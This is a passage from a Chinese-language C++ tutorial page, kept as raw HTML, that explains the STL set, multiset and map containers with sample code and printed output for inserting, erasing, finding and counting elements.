class=\"token function\">set4</span><span class=\"token punctuation\">(</span>set3<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> set3<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"\\nset4:\\t\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>set4<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> set4<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> myPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token comment\">// 复制 set 容器</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    set<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> <span class=\"token function\">set5</span><span class=\"token punctuation\">(</span>set4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>其中要使用  <code>for_each</code>  函数，需要包含头文件  <code>#include&lt;algorithm&gt;</code>    <code>algorithm</code>  头文件中是 STL 的一些算法。</p>\n<h4 id=\"添加元素-2\"><a class=\"anchor\" href=\"#添加元素-2\">#</a> 添加元素</h4>\n<p>添加元素可以使用 insert 函数，具体操作如下：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">SetInsert</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    set<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> s<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    s<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">// 单个元素添加</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    s<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span><span class=\"token number\">22</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    s<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">int</span> nAry<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span><span class=\"token number\">11</span><span class=\"token punctuation\">,</span><span class=\"token number\">12</span><span class=\"token punctuation\">,</span><span class=\"token number\">13</span><span class=\"token punctuation\">,</span><span class=\"token number\">14</span><span class=\"token punctuation\">,</span><span class=\"token number\">15</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">,</span><span class=\"token number\">17</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    s<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span>nAry<span class=\"token punctuation\">,</span> nAry <span class=\"token operator\">+</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 添加指定数组区间的值</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"s:\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> myPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    set<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> <span class=\"token function\">s2</span><span class=\"token punctuation\">(</span>nAry<span class=\"token operator\">+</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span> nAry <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"\\ns2:\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>s2<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> s2<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> myPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    s<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span>s2<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> s2<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"\\ns.insert:\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> myPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>需要注意的是 Set 容器不允许出现重复的键值（可以使用 Multiset 容器来使用重复的键值），并且默认会自动排序。</p>\n<p>打印结果如下：</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>s:</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>1       10      11      12      13      14      15      22</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>s2:</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>16      17</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>s.insert:</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>1       10      11      12      13      14      15      16      17      22</pre></td></tr></table></figure><h4 id=\"删除元素-2\"><a class=\"anchor\" href=\"#删除元素-2\">#</a> 删除元素</h4>\n<p>删除元素可以使用 erase 函数，详细操作如下：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">SetDelete</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    set<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> s<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>size_t i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">11</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        s<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"s.insert:\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> myPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token comment\">// 根据元素的键值删除元素</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    s<span class=\"token punctuation\">.</span><span class=\"token function\">erase</span><span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"\\ns.erase(9):\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> myPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    s<span class=\"token punctuation\">.</span><span class=\"token function\">erase</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 删除迭代器指向的元素</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"\\ns.erase(s.begin()):\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> myPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    set<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span><span class=\"token operator\">::</span>iterator itA <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    set<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span><span class=\"token operator\">::</span>iterator itB <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    itB<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    itB<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    s<span class=\"token punctuation\">.</span><span class=\"token function\">erase</span><span class=\"token punctuation\">(</span>itA<span class=\"token punctuation\">,</span> itB<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 删除指定迭代器区间内的元素</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"\\ns.erase(itA, itB):\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> myPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>打印结果如下：</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>s.insert:</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>0       1       2       3       4       5       6       7       8       9       10</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>s.erase(9):</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>0       1       2       3       4       5       6       7       8       10</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>s.erase(s.begin()):</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>1       2       3       4       5       6       7       8       10</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>s.erase(itA, itB):</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>3       4       5       6       7       8       10</pre></td></tr></table></figure><h4 id=\"修改元素\"><a class=\"anchor\" href=\"#修改元素\">#</a> 修改元素</h4>\n<p>Set 容器不可以直接修改容器内的数据，要想完成这个修改元素的操作，就先删除后增加。</p>\n<h4 id=\"查找元素\"><a class=\"anchor\" href=\"#查找元素\">#</a> 查找元素</h4>\n<p>查找元素可以使用 find 函数，这个函数返回的是一个迭代器，如果找到了就返回迭代器，如果没有找到就返回与 <code>s.end()</code>  一样的迭代器。</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">SetFind</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    set<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> s<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    s<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">// 单个元素添加</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    s<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span><span class=\"token number\">22</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    s<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    set<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span><span class=\"token operator\">::</span>iterator sit <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span><span class=\"token number\">22</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>sit <span class=\"token operator\">==</span>s<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"没有找到22\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"找到了22\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token operator\">*</span>sit <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    sit <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span><span class=\"token number\">33</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>sit <span class=\"token operator\">==</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"没有找到33\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"找到了33\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token operator\">*</span>sit <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>打印结果：</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>找到了 22</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>22</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>没有找到 33</pre></td></tr></table></figure><h4 id=\"判断元素在容器中是否存在\"><a class=\"anchor\" href=\"#判断元素在容器中是否存在\">#</a> 判断元素在容器中是否存在</h4>\n<p>判断元素是否存在，对于 Multiset 容器来说可以知道指定元素有几个。</p>\n<p>可以使用 count 函数来判断元素是否存在，这是一个统计数量的函数，返回值是指定元素的数量。<br />\n<strong>对于 Set 容器来说返回的 0 就是不存在，1 就是存在，单对于 Multiset 容器来说返回 0 为不存在，返回大于 0 则表示存在。</strong></p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">SetCount</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    set<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> s<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    s<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span><span class=\"token string\">\"s.count(1)的执行结果为：\"</span><span class=\"token operator\">&lt;&lt;</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    multiset<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> ms<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    ms<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    ms<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    ms<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    ms<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    ms<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    ms<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"ms.count(2)的执行结果为：\"</span> <span class=\"token operator\">&lt;&lt;</span> ms<span class=\"token punctuation\">.</span><span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>打印结果：</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>s.count (1) 的执行结果为：1</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>ms.count (2) 的执行结果为：4</pre></td></tr></table></figure><h2 id=\"mapmultimap容器\"><a class=\"anchor\" href=\"#mapmultimap容器\">#</a> Map/Multimap 容器</h2>\n<h3 id=\"什么是mapmultimap容器\"><a class=\"anchor\" href=\"#什么是mapmultimap容器\">#</a> 什么是 Map/Multimap 容器</h3>\n<ol>\n<li>底层使用平衡的搜索树：红黑树；</li>\n<li>元素包含两部分 key 和 value，key 和 value 可以是任意类型；</li>\n<li>根据元素的 key 自动对元素排序，因此根据元素的 key 进行定位很快，但根据元素的 value 定位很慢；</li>\n<li>不能直接改变元素的 key，可以通过 [] 操作符操作元素的 value；</li>\n<li>Map 容器中不允许 key 相同的元素，Multimap 容器允许 key 相同的元素。</li>\n</ol>\n<p>以下就是这两个容器内部的存储结构：</p>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n<h3 id=\"使用mapmultimap容器\"><a class=\"anchor\" href=\"#使用mapmultimap容器\">#</a> 使用 Map/Multimap 容器</h3>\n<p>在使用之前需要包含头文件和使用命名空间：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;map></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token keyword\">namespace</span> std<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h4 id=\"构造元素\"><a class=\"anchor\" href=\"#构造元素\">#</a> 构造元素</h4>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">MapConstructors</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    map<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> string<span class=\"token punctuation\">,</span> less<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">>></span> m1<span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 构造一个空的 map 